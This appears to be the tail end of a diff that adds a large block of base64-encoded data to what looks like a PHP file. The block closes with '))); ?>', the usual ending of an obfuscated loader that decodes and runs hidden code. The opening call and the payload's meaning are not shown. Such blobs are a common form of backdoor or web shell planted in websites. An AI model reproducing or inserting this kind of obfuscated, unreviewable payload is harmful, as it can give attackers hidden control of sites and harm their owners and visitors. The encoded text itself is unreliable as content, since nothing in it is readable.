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
+fSi0NyOND9o+9ADhceB7QMNwtrBFBpCHe8Tdu4uB
+mLsWszC1YthgwAKkxtrFUjE7mVTHNSi+CaKK421n
+7Z0SO8qjGAJx2lBb+CGpt7LUNbxd9cbU5araIsib
+rS/fmbrg0traMjxGn1tlVt+IyojoYX6lWV1Iacg1
+a81C1F6P3vDoaabaiEP4yU6G9/+lHQ0ZXqIZixR4
+5DK5OsGvHFb6P90m/OaRK67hdIUdKzdLPZH5gJfn
+GlEQa5Eu40+EchBv7YguoB1RW4CiKO64FiONTmlz
+A1u6Eb2qbkQX1Q0xYAFaB5oRvYpmiERgpmpgKcBb
+MRS53esq16oWqqUWx5eKv3jN+IieODwL40EntA2y
+f7vHPOlQRx9+HfYK1oTQY8900Vd6AQtqLtl3i/7K
+NNG/vGPgBM3vF1a+U7+wCLEz3ILw+/NpAOaaI/LP
+/9qHQx4iD0nl9yaA8hD37mR5bxsNR5fq7MIO4Gw0
+9uoOTX4Ih3/3GYu1/Jf3MNetZZntipfYdr+PwdcC
+tF5P6MVPYMb1a4l3ptyHIgAFQo5HCKkoagF5jwg4
+sJZcKcTleMczFxzhqX2U6zzHvTj7qkua/a9BsExR
+OT0UldPjLiMtfqxrNvu/aRNWS3I9Ou6/0ogyHGbd
+MR5DLM5/a4zeueNxDXlW/sLPucfqrNKchVaPI28/
+t4/+CIS4hqKzQ6obomo/V1FVml5VleYtq0pXqatK
+b6qwKs1ZWZUWKK1K38PaqjRHcVWas7oqzSyvSnPW
+V6XvdYFVmrvCKi1SYpUWq7FKixVZpcWrrNK8ZVZp
+wTqrtHChVbp0pRXchWzKIHBWp9O8ikuirirf1Lmc
+F0ARa3A2uH0BlINzciZXfqXx0q9kXTR31jXtSuvI
+rfMZp8VvzHvwZ8Zu/MaN37jxGzd+48Zv/L/zGx6J
++2je/sZ8hyKeQrpxHzfu48Z93LiPt9h9tMG8Yr2E
+ew6wqaG316GMlfss9zH2lO+8DqR9KBtM8fAgb8Rr
+pK/kDeZ4Qn8+K1PqUF2OvBtecxuZ1XA0SHZ0MF1a
+JB6OxcOJtTXyhOr4g08R+BpbebttBT5fP5eteEvN
+CwwaWJhJT+RLrgvjd+V2Z12ndVZLOW5w49hyt9EA
+QQLJMUpqgR0xtZGKcfCGgOYzOO+MY62Hms7L4teF
+XTz/1WIqlsKmar4c6egaXojmN5zrsnoXsYmA8i6E
+ew2mphBz1QK7O5kYQUgYeYKxgovYAz+nZcavCSCl
+wemA3jIujW/XqeRpckfC9EkV5YnWldUDhql3NIMP
+8ldBbMQWiiLfYLOq/M5FiMQFffA5jnsAFkY/4WvM
+P1Xrh2KxYDTsGazX8KvYvsGdeBsFvNmP6l3V0sdv
+TP2Nqb8x9d6mnqvbHa5v+MS/2zYLi1jt6sxpoLGn
+blaHdjgUR0uMf6da+ktgGzENAiuSbNuGuaw+3l/g
+5jvSYcoRPgzKjCroTVvG0WDLrfm5MZ8dWw7t94Jy
+u6T0PPdhqSk3ZedyvSeTJniUlA+WROkN90pcGwJu
+C6UnWfsePA6OO0f7iGGe4I9b1pjRacknyUO87YC4
+EHQ/fuBaWeLG/LT09LKI709FnEvn0pfFvDIVczm9
+cVnEqwceUrYokgdDJLZE4nA8D6lS1WTmySDp4aiD
++BDYlfwaSCqf5dLGc0bC5owdxOWjpZYmM+vy0UvB
+Jb+atNjDZXKHVT/UDnlgoDS7igruD9UOkUNQMPrE
+mWfeaN9xctI49gCcoLHX612KREA39gQcj1nqh6lh
+7mj/jBPMMkLO4M6QtWo2PZc+BfWg055jsHqDX/NZ
+2CqZNaPXtX8nh1m/fsNq858icAQLHCMI+DmCCo9f
+tIFd7aYWOXTAa0Pe24M3J9/8Bim9a98ZmBjpVnqi
+AT+/bZt1+9bD9997+Gc=
+'))); ?>
